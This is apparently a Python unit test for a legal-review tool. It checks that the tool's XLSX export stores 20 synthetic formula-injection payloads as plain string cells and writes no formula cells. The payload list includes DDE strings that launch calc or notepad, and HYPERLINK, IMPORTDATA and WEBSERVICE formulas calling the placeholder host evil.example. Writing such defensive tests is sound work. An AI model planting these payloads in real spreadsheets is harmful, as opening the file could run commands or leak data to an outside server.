# -*- coding: utf-8 -*-
"""施工单-10 单元一（2026-11-01）：表格导出公式注入防御——桥 Python 侧 XLSX 面。

机制来源＝竞品情报《2026-11-01 官方开源与兄弟逆向波》A 报告 §④ 条 6/7
（Excel 公式注入同威胁异表面；只学机制，零文本搬运）。

桥 Python 侧盘点结论：唯一表格导出面＝excel_export.py export.xlsx（F85，
最小 OOXML，全部字符串格 inlineStr，不经公式/数值推断）；Python 侧无 CSV
导出面（csv.writer/to_csv 全仓零命中）。故本面的防御断言＝xlsx 侧强制
cell type=string：合成负例 20 个 payload 过 export.xlsx 后，openpyxl 读回
每格 data_type=='s'（字符串格）且值逐字保留（xlsx 字符串格即惰性，无需
CSV 侧的前置撇号），并断言全簿零公式格（data_type=='f' 零出现）。
CSV 前置 `'` 面在 m1 node 侧（@juscite/legal tabularExportGuard + 桥
探针 tools/bridge/tabular_export_synthetic.mjs）。

全合成材料；harness seam 经 unittest.mock 注入（零仓外依赖）。
"""
from __future__ import annotations

import base64
import io
import json
import sys
import unittest
import unittest.mock
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "python"))

import excel_export  # noqa: E402
import legal_entry  # noqa: E402
from openpyxl import load_workbook  # noqa: E402

SCOPE = {"kind": "matter", "matterId": "matter-synth-u1"}

# 合成负例 20（与 node 侧 test/tabularExportGuard.test.ts 同族同序）
PAYLOADS = [
    "=cmd|'/C calc'!A0",
    "=CMD|' /C calc'!A0",
    "=2+5+cmd|'/C calc'!A0",
    '=HYPERLINK("http://evil.example/x","点击")',
    '=HYPERLINK("javascript:alert(1)","x")',
    "+1-1",
    "+cmd|'/C calc'!A0",
    "-2+3+cmd|'/C notepad'!A0",
    "@SUM(A1:A2)",
    "@cmd|'/C calc'!A0",
    "\t=cmd|'/C calc'!A0",
    "\r=cmd|'/C calc'!A0",
    "\n=1+1",
    " =cmd|'/C calc'!A0",
    '\t+HYPERLINK("http://evil.example","x")',
    "\t-2+2",
    "\r@SUM(1,2)",
    '=IMPORTDATA("http://evil.example/csv.csv")',
    '=WEBSERVICE("http://evil.example/ping")',
    "=@SUM(1+1)*cmd|'/C calc'!A0",
]


def _read_doc(values):
    rows = []
    for i, v in enumerate(values, start=1):
        rows.append({
            "rowId": f"row-{i}", "rowState": "done", "cells": [
                {"columnId": "note", "columnName": "备注（文档来源）",
                 "value": v, "cellGeneration": 1, "cellSource": "machine",
                 "supportStatus": "NO_STAMP"},
            ],
        })
    return {"columns": [{"id": "note", "name": "备注（文档来源）"}],
            "rows": rows}


class TabularExportFormulaGuardTests(unittest.TestCase):
    """export.xlsx ×20 payload：openpyxl 读回 data_type=='s'、零公式格。"""

    def _export(self, values):
        read_doc = _read_doc(values)

        def seam(method, args, config):
            if method == "tabular.read":
                return json.loads(json.dumps(read_doc))
            if method == "harness.review_support_read":
                return {"entries": {}}
            raise AssertionError("unexpected seam method: " + method)

        with unittest.mock.patch.object(excel_export, "_harness_call", seam):
            return legal_entry.call(
                "export.xlsx",
                {"scope": SCOPE, "review_batch_id": "brt-u1"}, {})

    def test_payloads_read_back_as_string_cells(self) -> None:
        got = self._export(PAYLOADS)
        book = load_workbook(io.BytesIO(base64.b64decode(got["xlsx_b64"])))
        sheet = book.active
        value_by_row = {}
        for row in sheet.iter_rows(min_row=2):
            value_by_row[row[0].value] = row[1]
        self.assertEqual(len(value_by_row), len(PAYLOADS))
        for i, p in enumerate(PAYLOADS, start=1):
            cell = value_by_row[f"row-{i}"]
            self.assertEqual(
                cell.data_type, "s",
                f"payload 必须落在字符串格（data_type=='s'）：{p[:24]!r}")
            # 值逐字保留；唯一例外=XML 1.0 行尾归一（文本节点字面 CR 解析侧
            # 规范化为 LF——OOXML 规格行为，Excel 同此），安全属性不受影响：
            # 归一后仍以 \n 起始的字符串格，不是公式格。
            self.assertEqual(cell.value, p.replace("\r", "\n"),
                             "xlsx 字符串格即惰性：值逐字保留，无需前置撇号")

    def test_no_formula_cell_in_workbook(self) -> None:
        got = self._export(PAYLOADS)
        book = load_workbook(io.BytesIO(base64.b64decode(got["xlsx_b64"])))
        formula_cells = [
            c.coordinate for row in book.active.iter_rows() for c in row
            if c.data_type == "f"]
        self.assertEqual(formula_cells, [], "全簿零公式格（不经公式/数值推断）")

    def test_numeric_amounts_stay_exact_strings(self) -> None:
        """我方自产纯数字金额（负数/千分位）同面不拦：十进制串原样入格。"""
        got = self._export(["-1200.00", "+300", "-1,200.50"])
        book = load_workbook(io.BytesIO(base64.b64decode(got["xlsx_b64"])))
        cells = [row[1] for row in book.active.iter_rows(min_row=2)]
        self.assertEqual([c.value for c in cells],
                         ["-1200.00", "+300", "-1,200.50"])
        self.assertTrue(all(c.data_type == "s" for c in cells))

    def test_marker_strip_still_span_exact(self) -> None:
        """回归：引文标记脱壳不受防御面影响（值列剥壳逐字、引用列 UNVERIFIED）。"""
        got = self._export(["预付=30%⟦引:《合》第三条⟧"])
        cell = got["projection"]["rows"][0]["cells"][0]
        self.assertEqual(cell["realValue"], "预付=30%")
        self.assertEqual(cell["markers"], ["《合》第三条"])
        book = load_workbook(io.BytesIO(base64.b64decode(got["xlsx_b64"])))
        row = list(book.active.iter_rows(min_row=2))[0]
        self.assertEqual(row[1].value, "预付=30%")
        self.assertEqual(row[1].data_type, "s")
        self.assertIn("UNVERIFIED", row[2].value)


if __name__ == "__main__":
    unittest.main()
